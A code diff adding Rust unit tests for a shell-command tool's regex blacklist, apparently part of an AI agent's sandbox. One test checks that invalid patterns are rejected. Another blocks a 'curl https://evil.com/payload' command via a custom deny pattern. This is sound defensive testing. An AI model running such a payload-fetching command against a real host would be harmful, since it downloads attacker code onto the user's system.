@@ -405,4 +405,39 @@ mod tests {
         assert!(t.is_command_blacklisted("rm -rf /tmp/my_build").is_none());
         assert!(t.is_command_blacklisted("rm -f somefile.txt").is_none());
     }
+
+    #[test]
+    fn invalid_custom_pattern_returns_error() {
+        let result = BashTool::new(
+            120,
+            SandboxConfig::default(),
+            vec!["[invalid(regex".to_string()],
+            false,
+        );
+        assert!(result.is_err(), "invalid regex pattern should return Err");
+        let err = result.unwrap_err().to_string();
+        assert!(
+            err.contains("Invalid blacklist pattern"),
+            "error message should mention invalid pattern, got: {err}"
+        );
+    }
+
+    #[test]
+    fn valid_custom_pattern_is_applied() {
+        let t = BashTool::new(
+            120,
+            SandboxConfig::default(),
+            vec!["curl.*evil\\.com".to_string()],
+            false,
+        )
+        .expect("valid regex should compile");
+        assert!(
+            t.is_command_blacklisted("curl https://evil.com/payload").is_some(),
+            "custom pattern should block matching command"
+        );
+        assert!(
+            t.is_command_blacklisted("curl https://good.com/data").is_none(),
+            "custom pattern should not block non-matching command"
+        );
+    }
 }
